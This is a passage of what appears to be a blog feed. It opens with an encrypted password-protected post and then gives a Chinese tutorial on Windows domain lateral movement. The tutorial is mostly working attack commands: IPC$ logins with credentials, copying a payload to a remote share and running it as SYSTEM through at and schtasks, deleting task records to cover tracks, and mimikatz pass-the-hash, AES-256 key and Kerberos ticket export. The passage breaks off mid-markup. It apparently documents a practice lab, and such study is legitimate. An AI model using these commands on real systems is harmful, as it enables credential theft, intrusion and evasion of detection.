9d71d66311f3a198ad95b4017dbcb488bf08076ca1bff5444e104a182d0addcd07d4c28877e4921a502037d29751fe55975724f34f51ed54e59206e9422544540a5e4a8cc6792cdf0335f03462da16597a418aa13844e0c769d21d9b4834bacaceb580f689876aa5d0aaf76b9353214252faa785b3da3c29016b96bb346e94e644962fa91b851d02d692176fc13eef8ee82f8bb9f96682e79c0ea1e6a3d295041975f05d524d39967b5c394ffa2fda6aa926ef64f6b69642bee69d2df8eddd81cbe8041103739ff02efba151cf1ce46133767ffe106920f7a98c52bb921ee06b3679d7031ee2a39eb3553a862850a8892c4be45a9f5500829147f0f6f727f3a213c4aff2213c8505bf130a98d51709aca0e9af3e06a59758566653e3cdff0b860fefb07a644387130aa4bfe3594afc3c09cd05f1f594650505661f1d1bac68e99a5b62be19648f76b47fb09048197a8d33f6794aab231ebd6c4abd631678f03c7382cff7bed4cf05d07978e49fcd910b319edc907e4d4fc991f01c80557da97fd30410e1fd7fd88136246fa812da7e3a19f17fe27545d49e07056b9bbcf4074c5ea68baba351434643ae12b0d1bd3fa2c7208bb5735607dab83e589f443649d6605b32058635e22eb467e6ebee2ea5d184185f6d062a554d5c7573f8693251b357dcc72e3908911a589280cd41427071af1a732a56d7d18b1dad20b5326bd44d456438201a04d43c4a9c2ce4776540064b3934ba4891d2d8b4d7885bea3a9384d01a4638f0bf3016d7e3dc3a0ff504a3d34eff2e17ec2111f30010a8ac0b6177a90afbd48b226c885740e254615bd5a47176a4c175eeabd2b0a2aacdd35286f02fee10ef9cb2aad633f162ffc7c0031787fdceac62c1ec09947a0a2f3e77b8f24bc73bed6c71b44bae2d8e3e596be3803c91e10b321a92b97b6d2cc7419139e7648e040f8898808afb1092d30d53660c574d7fff7792e39bec17cf690315d8a33e53189802789efef70b3e3ba1224355070dc93147346757b3bbc1066431df0958ec380a634050be116ab0322241bbba62a5c0e35916ebfd6a52acc895a0089587d514f5ea5b7e855a64707a71cee15573eb581840bde49b4b5a2dc21786fd43c9fbc0db992cdb5f95811db4619c6cd9a3b1bbb60e8d9d61ec3038c94ea8900bafe43a400ff0708d7e5b720445ac277358f3cfc908c6667698f0221e4fc6a96d46f9f70ac40f93e6657ba2eb9297c9e6e0af27155cfca33bb8bbe6c859c14f480e9a81dadfb85a1ae43d4901c62c1b7a830dcabc880de6f81c967b5a2d359229ae5737f5a16f0b34c049bdfe19afae7a79530b4f1c92aeb0e2d6f95b4568082c8e1a5a71d739a97282f67e3bef4a27f1940d8f3179522ff2de6c510d8379d5a4ccc763502df76d0e281072b50edc44a3f957dcb499001ada7c983150257a8d0a7fb2dfad577bda37a85a27518d147a2c1833827739d863a76c9916b252cd0a9a111ebf8c2f76d9f8cdb2b0863b45d163fe862d6566a2032832072bc98307e74ceb4c07c4e5165ccf646212801a3f35a8f726b4842afbbb6a5fab7dec67f10e56d40dd7a13f514bd1292c8614fd060cae5812c45763766a9ef6de6d9a75604df2dd24eb570a04c404ee2fcf2e3bb1080eab07dc3c5255f80bf91f2418f75c22467c6d65b8f8af36673fa948b3a67fda01e8e6f267dedfca10a7c7da761709e9cba63fc30eee207a2b3c67bf31818b5b6524e7fa79eac451236e8af708b2badd6d086339d7e5e5d03b65780fb1ce16ba4e02b0041a0107ffdaa2807f245cf775b79a5257c5f15ea81aaf41b119279cd955c7b96b58980bccd8ae652a4963d3cf21d42c58219b38198e8f97800856d69b326c1055d6113e7e2eeeb89872a9e80c72dd1d0b26b57110ed67fddef3ebeee729fb889701b6e9ef6b1d239a648694d0afaed1cfc6e3b4dcae39364d2b71452eb2641e4c9683deb11e07ebb635213c617ce5db8ebb6ed1eed98d88c5b52b4a95baf03a31e12000cee45bcd5825a42eb2a7a297f3b545ddd998c1aafef9b6204ac0cbc6945dd009ffd7201ba7a0b8e792922fd211fd5bba11aa9e8be039a684519c158eb157af0ba6003087b216dc8f0010ae1016e109f58935b4836022ef6b9f3236bca319297deb6ba5afc7c24a502d39a1ec66e04293dced4450775fa365fc5427cefc8e48dbe7b85c4365bdcb6aae2a3d9785056429000674d4123039e7501bde7a2ed47f385aa0c94475df6ac25f3d9d516b7691e93f3d8f0cef37cf4e97f46a4437da950d7f20d2ffe7f64036053af4c6f36cfc628b3fe25b57989fe8c9b5c8191be6126b8f046463bda2a37bfbe2445463a04ed10233b39bc9e19b35477e5dc218c79a929bf1f64a768cef6d05f14a9bf1c4855859c1613032b34ba1d2362d64f88b42c74be34ef0e9802be46db3a49c043563e4e9110031b5879db838b42275b79e850322ac6a9f4955a0c7859e98de904d795470aa651321d2dab3100fb0c03c14f06cf8ecad72e2536519711d68e28c5107e71d035a0735c226626de8e1839b476e116a1c2cd5db63e327727782dae6341efd77ba0fb81d85bc0c2b8fda4c5a36da2e798e7f3e5ec6bf4cd98782d3fde630623124d3628090ece4d412ff87b2bfbb0e3fae65c9716762197b0c182cc6b43aff0969c9547a0b5c79146d5a771663339c9d74e9ff70118dd39c20f799d598fda3b5621900bfc736787a62267a8aab1b0aaf73dfccc7c7b99c7a4e0cbbdde53bf3958f4bc9d0155a7b7ab5b4674dd2c949035802d92f80aacf1c8da2d846a25b9cbfadc400e56b29adf68d695263274bd090c57fb1b7b0182ea71909eb70da80c0b36c5bebd41080bc21c41c7612e839d44204beb6cfede32e9e17ce8b36e3c40fe18f920834c056bba352d55bfb15400b85be46c856db33acf730ee59ab0c293c22435b1cd770a8a843b16b0b3457792e7165f69de95a4ca56e16874f347e62a3bc611b2f14ea93e8093201d36919750c25cfddc80a01c694b2fc60f3c11236789fd5ea9b9ef7bddbd80a4babf8976d0b1673842983e8c3387645cd38c57dc8edbafe3159f522ccd7b0644f7a9772003ffa8a68047d3e8d2dc9c9b06a4da5e0d43dae312780f851cecc0e69f28f45d0bcc5230f90f34fb3da2a6d2eedff95bdde179cbe954b44643c816de90fd1e9eb7ae3a81dff4dce79fc8d3f3a421cad34a54af8f0f9c5350eaf009d53e8077f2f29256f6cc2908b04fda901ce64f8b7868067235d319b099156ef4ed8855e9fc1aad840bca1ab90fe9d0e9e8cf1b11ce19f41ab3aab5e330c8a6f128e01fdf4084cf333d15768405fd5beea74a90caf995c00a12155211c834f13cd1c2c9abbadad32b8cc8c1967a661b06a4b8c34a032d942bfeca36447243a647f0c5aa0915d1776574381864dd378a763632b6955269b4ddc0587429d79e39ae63c4440777ddcf92f435dcd05d62d86002a9512c89d7f99dec5bd36c9ae38b8b606afce3458089f79f3cdd362ad81bae1060fc763eacc8dd8081095908053b1ec58e8185f0eb4cbfa616d4865067b91685e27d0babcc2485547c25007f8eec0857b1ab5487184c37eaee4b1c3e2e4c1c100375237b0b7342d33f5a7ebc0875c0cd342b9a451ed0148273921c6fa247d0c6c636c7087666fb7739ec97c00005f19f30ecc2cdbc3eb9ce5294bd915512bcb6cffeb07933093ec914fa0c727b3c38a498f7c0f0e16cc47539c50dd81c44c997e470a58196618bd5da66904b8a7bc041349c5e40ce06df5059b35c668417c4ca3410e2af0cddc9409b3bb142482442624c78afea703f494dedec4264a7ba93f9eec66b99578856979e9f6866be450334bf1e0b9fa3081c9db8da5bbcbdd53bfce9458457ce889f63de5f4cc9a0afdc3ba9a5d5a4aa6730096d41ff66c75c898ef4e047048f7f61aca71a81d804fd594b71c8539fd9e28857ecb9c5502671b27282d6d409e05473b5597f4015256501646e2d180a69d4bc42c8f7a3cd75b7b971edebd9dd3a5b5ea6e7f5fbe0e6498a21f748bef5a00db45785b0dcd6cc529fe7a17fdfc5e9d1b36d82eaf1b72d51bd521dcd3961582b9cf937ea2b4924ec44f50a5b5eb1f733607381655a74f5c34548db8e87c18078cc29b70c5b78966c544ee04035a4ec881d8331c8661ee2d655480c26fbf8b1f050782235e3a432d9d1ecaa67c4675275fee95c7165922ff2ecb2387cba0e578d1a298d45b41e648f8797a54e962e8a9eab3695b8bbc0c32fae3c74c789f7a2b6f6cee1ab69e4ce41adb0ccc153afdb5167fbf0e0c9971194bcc2f477ceed39f6d76921c14740579d736224569ce6df61ce7cfb6cc513ad5e25dc140feeed93d722ffc54ffb2a626978e4761968572de15820cdf23aa55c332ec362d550cf671467a7f84fd36e8d1c79b48746677f8009692e0d4c6106d3f801357ce86e9f6eae42098d7cd43e121f2bd72e1eb1c5299d80f4499c6a5633ba6473da5a004635709765964eca1c65314d0aa91b34a503e926adee6fe0aea14d3b43d310a617458867e538dfacdbde501c5feb2852304956dbfa255a5802f4d1374686ac42b177e74d41693ba55b994be2f711ce55631c44753013ca90704fb38001373848b3feb2b947ed832075f33cf5011a8f0807a41f96957eb4f1a68359454f91d502743a449b8c66e10ec0a9c651e8e0cb570fc69ee6f6f10b98d1137b8d8e2371a5c152454eefcdf0e62b911727d987252ca1187f401bd8cdf3ee78b7c97fd11effb1aa4d53cb18716c4a1641a06dbe0684aa818d529c4b0d66dca7a1c77aaa2e79e760469a8c8c477dc15e13ef1cff859ae9fb5b41b9d515bf447d55957c91293f55e032f10f34d6a8a888ba89eb510cf5f6e01ac1fb2874555d2ffe4b41276459e5c3b411cc9ae06b48229815dc4dde4b8cd301a56a100bc2d522c37ed09692d787b99c67bb51d72c8832d680a2859dfdd79ca92977d53dd9c8cb8b91dc1eac893c7f5098377c4b7e4462c1ef02dcde8c28d86bf65f1cdcf69a9cdead8e48473bba7e95410b579124dd325f27e26f8962d4fd87dbb6685ad4d03278d302f6c209fb4d82fab0328e67c4511b219cb1f1817319192e220dba592f59dfa2ce1b0c9842e089c08ed468b68fa7673b2a42d328143eca61377d746b1e69d06a0174a589e6804dcc5688bfc881f6a90ec658f42c383bd0e9a96dba2fb971e35578aae04e3c0b95a542c0a2550ede7cae2117a2ba260bb13725820fa020db17706fbf6ed71231786c9e977bcaefbe33d4a288563b4e7550a9b58d450f0cb9c914b00736316c64f186f754e6c3bb64f4b0ac3cd37db09d69de17fe9af2c630ca2642f71fb6c2408c8ff8d3d2db16ee8b5b034b8873c62c4afb631747e921fcdb3b7c85cddfa1163c4e184d066650e4d44a16c4b029808bfab8ee244a8847738e741a1eb4cb83dcfafc7aba391f1c3476965b287c9f5762a8dea6964f68a3d0ceafeb35ecc0fb625ef993ac22c892edccc83b21ed5fcb0723eed99f8b45abb1cf6d8e4149fa67d21551480d75e7fb9949b21cfe227b84fb9496e275d493c151ae03e4c68d5445214151a0c4d22abdc046991020f8ae605545b3966a679886f617676dd805ec9c60f85ea6a9773c425d0788f3ff9261c0e423861be7d26c789539c59cd140da6667b394199b2209d5a9774007d56995000a7e6fbde41f3985c84e659013a706d68ef3ab898547bbfa1361bdd6a67a0819d41e2e36c03ef179f5f250cad98282e6ef37e45f40ec73f9742ffebf86902db3f76e325cb2ccf55d6e03901aceec3b8511de71e3edd7eed2d556bb803ad544ba0a4a90b0f66d32bef8fcc4402aed357298a1f2ade3a5e7a7d15ef301f03036cdfee2b3511763e37646c8b8e96493d1f14425e6e075184d9feb1112ce588a27b7ff612e11b3e8df986c5728f3f95b8a86ded3c128e5e713dd4d91475d4e734280743cb55bcf286767e0597be25b7092301b128c650689ecf987de879404843f035d97be72b5b6231c290bf8397c649a244d26b6ae82ee513a271e014ceb35c62e768503c909c65dd6030dd3dbe2e74422e264e309e5f52bb460eb061c28fdf3e4439bdea0241eb7803c304c9f0bb1f6006af653be4a80b3b7737caced852cd2c68736e214a20435f3833afe1136799cc1959c92a445824c76e84dd3bededda1ffe7de56d3dfcb42cb36cebd547a88e37cc0339650b09653a209579239c2f8c94559e3024adcd4e9bba0caa7faa8d4578b996e9a0ae7980d22cf6f1b7ffb9cea438d46f10c73da0c6e72359bb726b52294b70cc8d255f9aff1fbc825f6992d7264b2cdcd5503e83020f5e5b4f5236ce8642beac3c60f7d4c15bd708854ef29d5c00d410aef2899e3b9f1d323e26224e26e865eade95486194f5bb4e2e14cdb85ede5d08f7708ccfbb2715619205a2eaa63f9cbc2cbaa278e6b9e8e574ae1984620599a9c18a943d35a2e3866c37577218de29076cbb73211cbcb069a56d31c1817a2b3c43d630629627e93670eec0f3aa92e081b85d3bf7c67d7adea22171b8ececbb1e2e8bbe1f683451e59235d8ee1b1bf006281e224e4814801918e3b4e59657669d82137f40e415103027b43428ffa682cb8cab601c9765c42df5c64ebb56461279d9c84cf26e9a46341433e707a4712da016c3d5381d2ed90a32e2f3d9e4494c07dd0d1f21b58e97ae569f885e6118b63a85105963aea087640c1bc0e8c4f699485b75ce6b8db97206484804c0bd7701cc970b475ecc509ab6050bed6a6a35c6d98c43e782af96d7c62ac19e4cbdffef1df52ec87fe7fe5120161facb1f27863d91b5794f754d502b659b0e7f4cff6aaad396d9627f27445f1d8c489729c0d2d97ba1328d4f49a698de16014ef85e805d814989707b30e056252ec63f88757adbdcd4b86bb02d5db58b501567faa352a570e1c0a551d4675ecf79253715500c3846699a33ea569059f68f0084bfcd1eaff7378122b32d7b196622c74149dfe073dd6693017603c202d65ff11c7499c95fa6c272667e9be78906d51fd81fa0c4171cfac39615b35cd10684215a83adc7f6c37f14ff7fa07f59715fd21754f13955f2e83dfe3bd86c8e8198bada7b0e1b52c0244f3e2a9385498b17f92ee15d9c9c42f98d7b846ec96251410a174db9647e31d79741f3ef5671bb6124706a8a1e37c78c5f9da5385312933e6546402313458120795540e197fc16751a18b4b1f4ea7105158f5bd1135c2041c902959cb9bd2627640c91077a27889b06509006c6f6ce19830aab0772dc83b459b1b9a746220d1412ab9881307a8394b2abe49b09a9b396707e40c6c5349d79638c07a7954eaa0a154a5a81f661718aa93915a92b95cd3826601ee516bae9147fb645dc9fddde4534fef5ac45fd82f80ba5185a36424b0e54ae93b8601a0fff477ecddeed6f585f16758d3e17d940e84eab12c424c4c3b018013899c05636571bbb1468f1bdb1a4c3bfec4f2a87ab925d5fa14e57f7d7a65df095751659f9e923ccb7c8d82924038c05c2f8a397538e05b33eea2193df0e61213d0a59ea50963b69dd6628eae608cdb39ca6aa18f7cdfda13e7bd07a552e9797d801da56a89ea47c176a8cb3ba003fa69b9656aa84dd0612f01df473be67e608ee8dd158d253b17fb016843a8f8d7349383aa0c5d9fc0d747a3e536516d0a1558463e8fc9e4385480740740045f05a93ab704188c6388a6f027a5dc5f159559485044b399a1facad40288ed0b9904582c6c8a51a38da25af3f32cdd1cdd943167b9b216474b36cf0a53cfc782ed859b8c7d6741a866818c7ce2d63b2c494bf9d39160e6c5afe2c3b674d74aaa143a5906b146be900254aec74466f4232a1d28d69d8c6400e206ec07b385aa300793ac8097fa358c8b7a30fd643d0752ad6d4af17e2ad5cb4248fa9dd07fe936eee9574a4504601a91a665a0fa3b5be08cd8bbc5b9b0ada95e6468392eb29ad968d55975bb5487ccd3e79e884dd72b00290fdb9b57a8e1872df1993430c675517d6eb0a3b8acb76cdf48abe4ce5ba7a1ca7020fc45805816210ea7e57374af3b648b01b71fc3d40cb1ed2ad4ac1cb44d800ef0a84c84a76e187f93087d0e5a995a2d446a780377d930e7fbe625473166eced1423f9428ee9430aae06e49ea345080cded6903813f759e22962f49013ab0edecde708ba1ca7a649afb23d14a0035b8860d75eda6c43209b8220e3df6a02fefd2a4d3dba893d6240bb98237c6fb903a9ef349516c02562e33e95c4c15ac8249a3d235ab08c30ea238b6f01998d8f19be1c6f5e7e05c76c948cc40e57ae45a7cfa471053a66b63ad98629a65d4236b14272c346255d61a6ec1b87dde7da084073b49e19d847d6f66b1858b1dce02047b18f653d17d055ac947807cf1b32a2fe33a65714b244ac75d47e2a4171dd819b19671af2da0d36b797ef60d5c8fcec84db4d91bcb69b291404787b19c4dd6d5cd49dba80c76127af23ad2025e7c7d33564fc9ff16721991b4f271ccfed5b1b71c761f1d32c3451f4451165365d6fad5cf01e1140bd6257a653fe2a75bfdb22275b506fd45dc4aa16276a53222617b254aebf3bba9de691fbd3d85fd4955a4b543f306527105a81ea324f244a08182a2a19149571c2fabafb29d3515177af154895ffc1a162acb8454445eabd0a36908020b8b20f47236f4e3f8a5ea5945549e36d28ff11e12aed190c50ddd409039e195fac7e4594d07c172fa3dcfc2e9f36a06c859ffee4fa9c86cb511cca4fc7e8dbe6dda8713cf6a8e55755f358ab8b6119a1b81d486b2bd381e7b8fdb0d71b80716d68534e7f589d562ec481af961a71abd45381ce4c31d9422e108c39b88ba672e012665810da411504115e82924ba3e594e13a7f4ef194101fc29aca0294734cc754ce8d2ccf69bc6b85b0e0b5ad44b61cd47d7017bd504c6b1e3490675e8d8a447cbf028accb46fa183ee8dd59dede12fa54f3ffe826774acc484152836844836132fb78f7a62bbc33a2e2831fe939c60b978c84f0e37fc0e40f3dba4ea82cd590ab8dc30dbf864a961cef62e0959182d3d72acb51b924297c46923ec31f993d7577f9f7b1106fdc96a75064127474607f6c514cb66ca0061467a6bccac1ab288c1f663e4fe80cf68013ca20856b225ba4dd48c6134822a039d336143e6d280f5a26a046fe4cbcd7af2cdc6f0cd517dee7ae7ec6e7c959b29151e56972146679fda42cd5a4a128f82da448ab3d925cf13b124ad3e09c7ad9f9a813ac023b321c37bc9a02550b928bb07a21b03e042f5a597c3e0b455060f9c6df866dece5f8bb28ce5eb36c00966fe5d7dd672d94ced1757b3b4ee3ab8c217a713119cddf179a17fbb42cd9abd75c8445c5937edc65704a3f29d27caedf6f233f574089a7ba3796552e146cf9999487db122ad4e3d66974ece05769865de799c43ffade8da796998d16239501341682c964305d838a3492ff6dfc92d8cc9a9076516cc78322d1b5416c3560a2af8acafe1a3538178b25526f88decf836360cd51b9dad112e6850b3b3f296322b2dfbc333900a6fb82676552877524ee9c72a1f5e99bd2e6f98cb757da1db749fb747bf9c23c5f89bb8b83e6b30f51c132b0ddabac86ac46885e1ed1052e127d7acf4dfc76008a2f130c99c923a5d7dcc026a8bfc93c753d3d14cb8939a122ab6041ddab551f36553c1e9b5e3404ec9e764b44380c37423c5c84b39db7948cf06529c87743b29ffd94a890ee4fe970684a0b9658c16e2de4992803dde2c865c405da907e0f7274cb128f1e4d67b81701eda52c5021a6faf4d51e25a27712138f28d3ad11c1fae5d4f6d3cf9aa001a2cf9c025ec64fe4e62c83d95a3726decb192826f7dc060575764c0b6988e17a2d1b2c8f1791e1575fa4d3f3e8da860b1eacb9656b26f93b8fff5d9b207f87f76ef40129227b6d5bd09d3d2035a8abab19a744d52690e5908dc68cb19fb13ea8a70f252d7dff86f0e37b7cab6811f2af4535ed92b891a16fc7481b54c2158581900f049fd710f1212a9c187fcb93c74e6486c46871ad4ef06f041bfa3036e4a52990a786f37f8fce58ae4701f500fbd85698d9eb2f7f2f8ac1f3e189ffbe3fd405b6af7a57c7ab15191114e89633b0ee240e7dfd2f0e937974cd4a33fa01cdc4dc4d81480135e4f191be14f1c74438cd06139c22e40c18e8992eb0aaa4783664c658d96019e5c2d129462f69b76daf1bb4b52c5e58f9722e57cc7b1b8d487a38ba673bb38caa5c4e6db29b6836b99459e37632e282910579154a329deac85a3d8e7eb45d1acee2223cebc59ab95c819b5f8338b37baa1bef6f439ac62f7842f0931d12d888914b66803ad2bbe2a692444532993a9cd5d18e1f22d2dd9bcfbce1e31aa08f514980ef816bdd9836ef36e685587d2c947289d838d751bd20a3d5c9f204cbf5656d04795803d4139be55e52245f94fa2e11b7010b528292bb4b593cbd5d1b701efcdadfc38c2a35c34be8df0f25314cb2636f9365f74c592c4088cc883e44ab84c6fe8baeb66998f405766cab10f9ad521c93fff533b656ef298e1ab7d16572f4fc038d0d4cb6d7ca214143f1af6b683decc8a87285b7cacdbf417b7a67d91ac95ec9cf0a222086936e0827e436fc4e475e1be5e22255bd6cc4bf1b64f6fdf8b6bb6b56a5ad572ce42d1679500a656a871ac310d6c738233eb125eb7715086e1c8fe0d136386f14d16a7e99c34bd26b48dd6c742dc49686581adbb6c43e863dac6c5b9132e9726145d1797e7051c208738f375cf22241c1c4b2a7140db62c7b4dc28e0f68da983a6ae6e45c6849b97ea9cc0d439285efeabe41ffeba7998e64d01a832a7c29e350e54b809f57704ffe6f886e748327d31254eca0d23aa114cdbbefda7f77a2c02212756796b19af83aa0947bc135d395f296866a30a211b40092f17c11646ec1317a0e825443caed7be8aaedf5334c3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idea</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域内横向移动</title>
    <link href="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="常用Windows远程连接和相关命令"><a href="#常用Windows远程连接和相关命令" class="headerlink" title="常用Windows远程连接和相关命令"></a>常用Windows远程连接和相关命令</h2><p>在渗透测试中，拿到目标计算机的用户明文密码或者NTLM Hash后，可以通过PTH(Pass the Hash，凭据传递)的方法，将散列值或明文密码传送到目标机器中进行验证。与目标机器建立连接后，可以使用相关方法在远程Windows操作系统中执行命令。</p><ul><li><strong>IPC</strong><br>  IPC共享“命名管道”的资源，是为实现进程间通信而开放的命令管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。<br>  IPC利用条件<br>  1.一般来讲 ipc$需要139，445端口的支持。<br>  2.管理员开启了默认共享（默认共享是为了方便管理员进行远程管理而默认开启的，包括所有逻辑盘(c$,d$,e$等）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\ip\ipc$ <span class="hljs-string">&quot;password&quot;</span> /user:username<br></code></pre></td></tr></table></figure><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107213952669.png" alt="image-20240107213952669"><br><strong>建立连接后使用Windows自带的工具获取远程主机信息</strong><br> 1.DIR命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> \\DC\c$<br>或<br><span class="hljs-built_in">dir</span> \\ip\c$<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214001457.png" alt="image-20240107214001457"><br>2.tasklist</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /S 10.10.10.11 /U de1ay /P 274355ZWz<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214011470.png" alt="image-20240107214011470"><br>3.at 计划任务<br>确认目标系统时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net time \\10.10.10.11<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214019260.png" alt="image-20240107214019260"><br>将文件复制到目标系统中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy payload.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214028393.png" alt="image-20240107214028393"></p><p>使用at创建计划任务（现基本为schtasks命令了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在下午1.30运行这个程序</span><br>at  \\10.10.10.11 1.30 PM C:\payload.exe<br><span class="hljs-comment">#清除at记录</span><br>at \\10.10.10.11 7(at的任务<span class="hljs-built_in">id</span>号） /delete<br><span class="hljs-comment">#使用at命令执行命令并将结果写入文件</span><br>at \\10.10.10.11 4.41 PM cmd.exe /c <span class="hljs-string">&quot;ipconfig &gt;c:\1.txt&quot;</span><br></code></pre></td></tr></table></figure><p>使用schtasks命令创建计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在远程主机中创建名称为”one&quot;的计划任务，该计划任务开机时启动，启动程序为c盘下的s.exe文件,启动权限为system</span><br>schtasks /create /s 10.10.10.11 /tn one /sc onstart /tr c:\s.exe /ru system /f <br><span class="hljs-comment">#执行该计划任务(在建立ipc连接后不需要输入密码，如果没有建立Ipc连接需要输入密码添加  /u:username /p:password</span><br>schtasks /run /s 10.10.10.11 /i /tn <span class="hljs-string">&quot;one&quot;</span><br><span class="hljs-comment">#执行完后删除计划任务</span><br>schtasks /delete /s 10.10.10.11 /tn <span class="hljs-string">&quot;one&quot;</span> /f<br></code></pre></td></tr></table></figure><p>此后还需要删除ipc$</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use 名称 /del /y<br></code></pre></td></tr></table></figure><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><ul><li><strong>mimikatatz</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /ntlm:c271ea43b54feee894fa2d0860e8914f&quot;</span><br></code></pre></td></tr></table></figure><p>输入命令后会弹出一个cmd，此时可以链接目标机了<br><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214040389.png" alt="image-20240107214040389"></p><ul><li><strong>使用AES-256密码进行哈希传递</strong><br>获取AES-256密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::ekeys&quot;</span><br></code></pre></td></tr></table></figure><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214050840.png" alt="image-20240107214050840"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /aes256:9c089a15cce776f40c04a817e8df797f6fe941a96f7803e7d00288255a4fe1f9&quot;</span><br></code></pre></td></tr></table></figure><p>使用AES-256目标机上必须装有KB2871997，该补丁禁止本地管理员权限与远程主机进行连接。也就是无法通过本地管理员权限对远程计算机使用PsExec,wmi等。<br>也无法进行常规的哈希传递攻击，但Administrator(SID为500）依然可以。</p><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p>要想使用mimikatz的哈希传递功能，必须具有本地管理员权限。mimikatz同样提供了不需要管理员权限进行横向渗透测试的方法。例如票据传递。</p><ul><li><strong>使用Mimikatz进行票据传递</strong><br> 将内存中的票据导出</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span><br></code></pre></td></tr></table></figure><p>执行命令后会在当前目录多个服务的票据文件。<br>使用mimikatz清除内存中的票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::purge<br></code></pre></td></tr></table></figure><p><img 